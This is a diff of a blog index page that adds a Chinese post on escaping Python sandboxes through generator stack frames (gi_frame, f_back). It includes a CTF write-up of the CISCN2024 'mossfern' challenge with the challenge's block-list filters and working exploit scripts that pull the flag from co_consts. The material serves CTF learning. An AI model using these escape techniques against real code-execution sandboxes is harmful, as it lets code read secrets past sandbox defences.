@@ -195,6 +195,561 @@
         
 
 <div class="post">
+    <a href="/2024/07/31/Python-Stack-Frame-Sandbox-Escape/">
+        <h2 class="post-title">Python栈帧沙盒逃逸</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/31
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <hr>
+<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>栈帧其实是生成器执行过程中产生的，先来了解一下生成器</p>
+<p>Python的生成器是一种python语言独有的一种特性，在其他语言中是没有的。python的生成器是一种特殊的迭代器，可以逐个地产生元素，而不是一次性产生所有元素。<code>生成器的工作方式与迭代器相似，可以通过for循环或者next()函数逐个获取生成器中的元素，而且生成器还支持惰性计算，即只有在需要时才会计算下一个元素。</code></p>
+<br>
+
+<p>在python中，生成器可以用yield关键字来定义，yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p>
+<br>
+
+<p><code>简单来说，生成器在被调用时遇到yield关键字就会暂停并保留当前状态，当再次被调用才往下继续执行，可以类比return，生成器用yield返回值而不用return。一个例子：</code></p>
+<pre><code class="python">def f():  #定义一个生成器函数
+  a = 1
+  while True:
+    yield a  #被调用后输出并保留状态
+    a += 1
+    
+def plus(a,b):  #定义一个普通的函数
+    c = a + b
+    return c    
+    
+f = f()  #实例化生成器
+print(next(f)) #1
+print(next(f)) #2
+print(next(f)) #3  
+
+print(f)  #&lt;generator object f at 0x000001E05F614C40&gt;
+print(plus)  #&lt;function plus at 0x000001E05F8391C0&gt;
+
+#而且系统可以明显根据函数内部是否有yield关键字判断该函数是否为生成器
+</code></pre>
+<p>每次调用<code>f()</code>这个函数它会立即返回一个生成器对象，而不是执行函数体。然后，每次调用生成器对象的<code>__next__()</code>方法（或者使用next()函数）时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。<code>不怎么懂没关系，只要知道generator获取yield定义的值通过next()函数 or for循环（for循环的原理是生成器是特殊的迭代器）</code></p>
+<br>
+
+<p>总的来看，生成器有以下几个特点：</p>
+<ol>
+<li>语法上和函数类似：生成器函数和普通函数的定义相似，都使用def语句进行定义，差别在于，生成器使用yield语句返回值，而常规函数使用return语句返回值。</li>
+<li>自动实现迭代器协议：生成器是一个特殊的迭代器，作为迭代器，解释器自动实现了迭代器协议，以便应用到迭代中（如for循环，sum函数）。由于生成器自动实现了迭代器协议，所以，我们可以调用它的next方法，并且，在没有值可以返回的时候，生成器自动产生StopIteration异常</li>
+<li>执行过程的状态挂起：生成器使用yield语句返回一个值。yield语句挂起该生成器函数的状态，保留足够的信息，以便以后从它离开的地方继续执行。</li>
+</ol>
+<p>生成器与函数的区别：</p>
+<ul>
+<li>生成器函数包含一个或多个 yield 语句。</li>
+<li>生成器函数在调用时，返回一个对象(迭代器) ，但不会立即开始执行。</li>
+<li>生成器函数自动实现迭代器的两个魔法方法，因此可以使用next()迭代这些项。</li>
+<li>生成器函数一旦创建，函数将暂停并将控制转移到调用方。</li>
+<li>生成器函数的局部变量及其状态在连续调用之间被记住。</li>
+<li>当生成器函数终止时，在进一步调用时自动引发 StopIteration。</li>
+</ul>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h2><p>为了节省代码量，生成器可以用表达式的形式构建，可以不用构造函数，用表达式写，但是使用圆括号而不是方括号</p>
+<pre><code class="python">a=(i+1 for i in range(100))
+#next(a)
+for value in a:
+    print(value)
+</code></pre>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h2><p><code>gi_code</code>: 生成器对应的code对象。</p>
+<p><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。</p>
+<p><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。</p>
+<p><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。</p>
+<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<br>
+
+<p>重点是<code>gi_frame</code>属性：</p>
+<p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息</p>
+<br>
+
+<p>一个实例来演示如何利用生成器的gi_frame属性来获取生成器的当前栈帧信息</p>
+<pre><code class="python">def generator():
+  yield 1
+  yield 2
+  yield 3
+  
+gen = generator()
+
+# 获取生成器的当前帧信息
+frame = gen.gi_frame
+
+# 输出生成器的当前帧信息
+print(&quot;Local Variables:&quot;, frame.f_locals)
+print(&quot;Global Variables:&quot;, frame.f_globals)
+print(&quot;Code Object:&quot;, frame.f_code)
+print(&quot;Instruction Pointer:&quot;, frame.f_lasti)
+</code></pre>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h2><p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<code>每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。</code>这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<br>
+
+<p>栈帧包含了以下几个重要的属性：</p>
+<p><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
+<p><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
+<p><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。</p>
+<p><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。</p>
+<p><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h2><p>原理是主要利用<code>f_back</code> 返回上一帧进而逃逸出沙箱获取globals全局符号表</p>
+<pre><code class="python">s3cr3t = &#39;lwt is fool&#39;
+
+codes = &#39;&#39;&#39;
+def waff():
+  def f():
+    yield g.gi_frame.f_back
+  
+  g = f()  #生成器
+  
+  frame = next(g)  #获取生成器的栈帧对象
+  
+  b = frame.f_back.f_back.f_globals[&#39;s3cr3t&#39;]  
+  return b 
+  
+b = waff()
+
+&#39;&#39;&#39;
+
+locals=&#123;&#125;
+code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  #创造一个名为test的沙箱
+exec(code,locals)
+print(locals[&quot;b&quot;])
+
+#运行得到s3cr3t的值
+</code></pre>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h2><ul>
+<li><p>获取生成器的栈帧对象用到的是<code>next()</code>函数，也就是yield所定义的值</p>
+</li>
+<li><p><code>compile(codes,”test”,”exec”)</code>是创建一个名为<code>test</code>的python沙箱环境</p>
+<br></li>
+</ul>
+<p><code>理解逃逸顺序</code></p>
+<pre><code class="python">s3cr3t = &#39;lwt is fool&#39;
+
+codes = &#39;&#39;&#39;
+def waff():
+  def f():
+    yield g.gi_frame.f_back
+  
+  g = f()  #生成器
+  
+  frame = next(g)  #获取生成器的栈帧对象
+  print(frame)
+  print(frame.f_back)
+  print(frame.f_back.f_back)
+ 
+
+&#39;&#39;&#39;
+
+locals=&#123;&#125;
+code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  #创造一个名为test的沙箱
+exec(code,locals)
+</code></pre>
+<p><img src="https://s2.loli.net/2024/07/31/EmUf8wyCdLaNnDO.png" alt="j简单演示"></p>
+<br>
+
+<p>顺序为</p>
+<pre><code class="python">f -&gt; waff -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(taoyi.py) 
+</code></pre>
+<br>
+
+<p>但是<code>yield g.gi_frame.f_back</code>并不能修改为<code>yield g.gi_frame</code></p>
+<p>这样获取到的栈帧经过<code>f_back</code>后获得的是<code>None</code></p>
+<br>
+
+<p>多一个也不行，会报错，原因是多一个<code>f_back</code>会调用<code>waff()</code>再上一层的调用<code>waff()</code>的函数，但是例子里面明显<code>waff()</code>上面没有了，所以我们可以再创建一个</p>
+<pre><code class="python">codes = &#39;&#39;&#39;
+def Fluorine():
+  def waff():
+    def f():
+      yield g.gi_frame.f_back
+
+    g = f()  #生成器
+
+    frame = next(g)  #获取生成器的栈帧对象
+    print(frame)
+    print(frame.f_back)
+    print(frame.f_back.f_back)
+    print(frame.f_back.f_back.f_back)
+    
+
+  waff()
+Fluorine()  
+&#39;&#39;&#39;
+
+locals = &#123;&#125;
+code = compile(codes, &quot;test&quot;, &quot;exec&quot;)  # 创造一个名为test的沙箱
+exec(code, locals)
+
+#这里的顺序为 f -&gt; waff -&gt; Fluorine -&gt; &lt;module&gt;(test) -&gt; &lt;module&gt;(taoyi.py)
+</code></pre>
+<p><img src="https://s2.loli.net/2024/07/31/2yKDxRET3Gu8zWM.png" alt="多层f_back"></p>
+<p><br><br></p>
+<br>
+
+<h2 id="globals中的-builtins-字段"><a href="#globals中的-builtins-字段" class="headerlink" title="globals中的__builtins__字段"></a>globals中的__builtins__字段</h2><p><code>__builtins__</code>模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。使用 <code>dir(__builtins__)</code> 来查看所有可用的内置函数和异常的列表</p>
+<p><img src="https://s2.loli.net/2024/07/31/HCMO3NzoiFthc2D.png" alt="builitins.png"></p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="例题：CISCN2024-mossfern"><a href="#例题：CISCN2024-mossfern" class="headerlink" title="例题：CISCN2024 mossfern"></a>例题：CISCN2024 mossfern</h2><p>用ctfshow复现的，但是没有前端环境，比赛的时候是有提交框提交python代码的，这里让我们对&#x2F;run路由传json数据，同时给了我们两个附件</p>
+<br>
+
+<p><strong>main.py</strong></p>
+<pre><code class="python">import os
+import subprocess
+from flask import Flask, request, jsonify
+from uuid import uuid1
+
+app = Flask(__name__)
+
+runner = open(&quot;/app/runner.py&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;).read()
+flag = open(&quot;/flag&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;).readline().strip()
+
+@app.post(&quot;/run&quot;)
+def run():
+    id = str(uuid1())
+    try:
+        data = request.json
+        open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(
+            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))
+        open(f&quot;/app/uploads/&#123;id&#125;.txt&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(data.get(&quot;code&quot;, &quot;&quot;))
+        run = subprocess.run(
+            [&#39;python&#39;, f&quot;/app/uploads/&#123;id&#125;.py&quot;],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            timeout=3
+        )
+        result = run.stdout.decode(&quot;utf-8&quot;)
+        error = run.stderr.decode(&quot;utf-8&quot;)
+        print(result, error)
+
+        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.py&quot;):
+            os.remove(f&quot;/app/uploads/&#123;id&#125;.py&quot;)
+        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.txt&quot;):
+            os.remove(f&quot;/app/uploads/&#123;id&#125;.txt&quot;)
+        return jsonify(&#123;
+            &quot;result&quot;: f&quot;&#123;result&#125;\\n&#123;error&#125;&quot;
+        &#125;)
+    except:
+        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.py&quot;):
+            os.remove(f&quot;/app/uploads/&#123;id&#125;.py&quot;)
+        if os.path.exists(f&quot;/app/uploads/&#123;id&#125;.txt&quot;):
+            os.remove(f&quot;/app/uploads/&#123;id&#125;.txt&quot;)
+        return jsonify(&#123;
+            &quot;result&quot;: &quot;None&quot;
+        &#125;)
+
+if __name__ == &quot;__main__&quot;:
+    app.run(&quot;0.0.0.0&quot;, 5000)
+</code></pre>
+<br>
+
+<br>
+
+<p><strong>runner.py</strong></p>
+<pre><code class="python">def source_simple_check(source):
+
+    &quot;&quot;&quot;
+    Check the source with pure string in string, prevent dangerous strings
+    :param source: source code
+    :return: None
+    &quot;&quot;&quot;
+
+    from sys import exit
+    from builtins import print
+
+    try:
+        source.encode(&quot;ascii&quot;)
+    except UnicodeEncodeError:
+        print(&quot;non-ascii is not permitted&quot;)
+        exit()
+
+    for i in [&quot;__&quot;, &quot;getattr&quot;, &quot;exit&quot;]:
+        if i in source.lower():
+            print(i)
+            exit()
+
+def block_wrapper():
+    &quot;&quot;&quot;
+    Check the run process with sys.audithook, no dangerous operations should be conduct
+    :return: None
+    &quot;&quot;&quot;
+
+    def audit(event, args):
+
+        from builtins import str, print
+        import os
+
+        for i in [&quot;marshal&quot;, &quot;__new__&quot;, &quot;process&quot;, &quot;os&quot;, &quot;sys&quot;, &quot;interpreter&quot;, &quot;cpython&quot;, &quot;open&quot;, &quot;compile&quot;, &quot;gc&quot;]:
+            if i in (event + &quot;&quot;.join(str(s) for s in args)).lower():
+                print(i)
+                os._exit(1)
+    return audit
+
+def source_opcode_checker(code):
+    &quot;&quot;&quot;
+    Check the source in the bytecode aspect, no methods and globals should be load
+    :param code: source code
+    :return: None
+    &quot;&quot;&quot;
+
+    from dis import dis
+    from builtins import str
+    from io import StringIO
+    from sys import exit
+
+    opcodeIO = StringIO()
+    dis(code, file=opcodeIO)
+    opcode = opcodeIO.getvalue().split(&quot;\\n&quot;)
+    opcodeIO.close()
+    for line in opcode:
+        if any(x in str(line) for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;]):
+            if any(x in str(line) for x in [&quot;randint&quot;, &quot;randrange&quot;, &quot;print&quot;, &quot;seed&quot;]):
+                break
+            print(&quot;&quot;.join([x for x in [&quot;LOAD_GLOBAL&quot;, &quot;IMPORT_NAME&quot;, &quot;LOAD_METHOD&quot;] if x in str(line)]))
+            exit()
+
+if __name__ == &quot;__main__&quot;:
+
+    from builtins import open
+    from sys import addaudithook
+    from contextlib import redirect_stdout
+    from random import randint, randrange, seed
+    from io import StringIO
+    from random import seed
+    from time import time
+
+    source = open(f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;, &quot;r&quot;).read()
+    source_simple_check(source)
+    source_opcode_checker(source)
+    code = compile(source, &quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
+    addaudithook(block_wrapper())
+    outputIO = StringIO()
+    with redirect_stdout(outputIO):
+        seed(str(time()) + &quot;THIS_IS_SEED&quot; + str(time()))
+        exec(code, &#123;
+            &quot;__builtins__&quot;: None,
+            &quot;randint&quot;: randint,
+            &quot;randrange&quot;: randrange,
+            &quot;seed&quot;: seed,
+            &quot;print&quot;: print
+        &#125;, None)
+    output = outputIO.getvalue()
+
+    if &quot;THIS_IS_SEED&quot; in output:
+        print(&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;)
+        print(&quot;bad code-operation why still happened ah?&quot;)
+    else:
+        print(output)
+</code></pre>
+<p>可以看出做了很多防御手段目的是为了一个安全的python代码运行环境，主要是关键词sandbox考虑到这个栈帧沙箱逃逸（就是runner.py里面的一句创建了一个沙箱<code>code = compile(source, &quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)</code></p>
+<br>
+
+<br>
+
+<p>runner.py中把<code>__builtins__:none</code> ，所以不能用next()来获取生成器栈帧，但是生成器是一种特殊的迭代器，可以用for语句来绕一下<code>[x for x in g][0]</code></p>
+<br>
+
+<br>
+
+<p>简单试一下获取全局变量</p>
+<pre><code class="python">import requests
+import json
+
+code = &#39;&#39;&#39;
+def waff():
+   def f():
+     yield g.gi_frame.f_back
+     
+   g = f()
+   frame = [x for x in g][0]
+
+   print(frame.f_back.f_back.f_back.f_globals)   
+
+waff()
+
+&#39;&#39;&#39;
+
+response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
+print(response.text)
+</code></pre>
+<p>向上逃逸三次得到全局变量globals</p>
+<p><img src="https://s2.loli.net/2024/07/31/DFHqdVJztb9kS4U.png" alt="获取globals.png"></p>
+<br>
+
+<br>
+
+<p>得到globals我们还要得到dir这个函数来查看一个对象包含的方法属性变量等，注意过滤了双下划线，稍微绕一下<code>[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]</code></p>
+<pre><code class="python">import requests
+import json
+
+code = &#39;&#39;&#39;
+def waff():
+   def f():
+     yield g.gi_frame.f_back
+   g = f()
+   frame = [x for x in g][0]
+
+   globals=frame.f_back.f_back.f_back.f_globals
+   builtins=globals[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]
+   dir=builtins.dir
+   print(dir(globals))
+waff()   
+
+&#39;&#39;&#39;
+
+response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
+print(response.text)
+</code></pre>
+<p><img src="https://s2.loli.net/2024/07/31/M9JyFD3tfrI7mne.png" alt="获取builtins.png"></p>
+<br>
+
+<p>获取到<code>__builtins__</code>其实第一反应是SSTI里面调用<code>eval</code>直接执行系统命令的，但其实要调用eval要用到<code>os</code>模块但<code>runner.py</code>里面已经ban掉了，所以参考了一些大师傅们的WP</p>
+<pre><code class="python">#runner.py里面的audit函数明确ban掉了os
+def audit(event, args):
+
+        from builtins import str, print
+        import os
+
+        for i in [&quot;marshal&quot;, &quot;__new__&quot;, &quot;process&quot;, &quot;os&quot;, &quot;sys&quot;, &quot;interpreter&quot;, &quot;cpython&quot;, &quot;open&quot;, &quot;compile&quot;, &quot;gc&quot;]:
+            if i in (event + &quot;&quot;.join(str(s) for s in args)).lower():
+                print(i)
+                os._exit(1)
+</code></pre>
+<br>
+
+<p>注意到main.py里面有</p>
+<pre><code class="python">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(
+            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))
+</code></pre>
+<p>以上代码的作用是将flag变量替换为了runner文件中的THIS_IS_SEED，导致flag的值成为一个常量，只要我们逃出沙箱后用<code>f_code</code>来得到代码对象再用<code>co_consts</code>属性来查看该代码块中所用到的所有常量，就可以得到THIS_IS_SEED，也就是flag的值</p>
+<br>
+
+<p>但同时在runner.py中对输出作检测</p>
+<pre><code class="python">if &quot;THIS_IS_SEED&quot; in output:
+       print(&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;)
+       print(&quot;bad code-operation why still happened ah?&quot;)
+</code></pre>
+<p>就是如果SEED作为常量在输出中就会被waf掉</p>
+<br>
+
+<p>所以我们用<code>builtins</code>的<code>str</code>函数将flag一个一个字符输出</p>
+<pre><code class="python">import requests
+import json
+
+code = &#39;&#39;&#39;
+def waff():
+   def f():
+     yield g.gi_frame.f_back
+     
+   g = f()
+   
+   frame = [x for x in g][0]
+
+   globals = frame.f_back.f_back.f_back.f_globals
+   builtins = globals[&quot;_&quot;&quot;_builtins_&quot;&quot;_&quot;]
+   flag = frame.f_back.f_back.f_back.f_code.co_consts
+   str = builtins.str
+   flag = str(flag)
+   for i in flag:
+     print(i,end=&#39;&#39;)
+waff()   
+
+&#39;&#39;&#39;
+
+response = requests.post(&#39;&lt;http://f28ad523-d25c-46ae-9b70-6db5e1da364b.challenge.ctf.show/run&gt;&#39;,json=&#123;&quot;code&quot;:code&#125;)
+print(response.text)
+</code></pre>
+<p><img src="https://s2.loli.net/2024/07/31/OeBAZFQgr29qKGy.png" alt="getflag.png"></p>
+<br>
+
+<br>
+
+<br>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></li>
+<li><a target="_blank" rel="noopener" href="https://c0rnfl0w3r.github.io/2024/06/04/CISCN2024-web%E5%A4%8D%E7%8E%B0/index.html">https://c0rnfl0w3r.github.io/2024/06/04/CISCN2024-web复现/index.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://mcat-e.github.io/2024/06/07/python%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://mcat-e.github.io/2024/06/07/python帧栈沙箱逃逸/</a></li>
+<li><a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://zer0peach.github.io/2024/04/29/python栈帧沙箱逃逸/</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/spiritx/article/details/132504456">https://blog.csdn.net/spiritx/article/details/132504456</a></li>
+</ul>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/Python/" style="color: #ff7d73">Python</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/31/Python-Stack-Frame-Sandbox-Escape/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/07/21/Linux-privilege-escalation#1/">
         <h2 class="post-title">Linux提权#1</h2>
     </a>
@@ -579,7 +1134,7 @@ cat /etc/doas.conf
         
         <span class="tag">
             
-            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ffa2c4">Linux提权 渗透测试</a>
+            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">Linux提权 渗透测试</a>
         </span>
         
     </div>
@@ -1102,7 +1657,7 @@ echo urlencode(serialize($a));
         
         <span class="tag">
             
-            <a href="/tags/CTF-Web-Session/" style="color: #ffa2c4">CTF-Web Session</a>
+            <a href="/tags/CTF-Web-Session/" style="color: #00bcd4">CTF-Web Session</a>
         </span>
         
     </div>
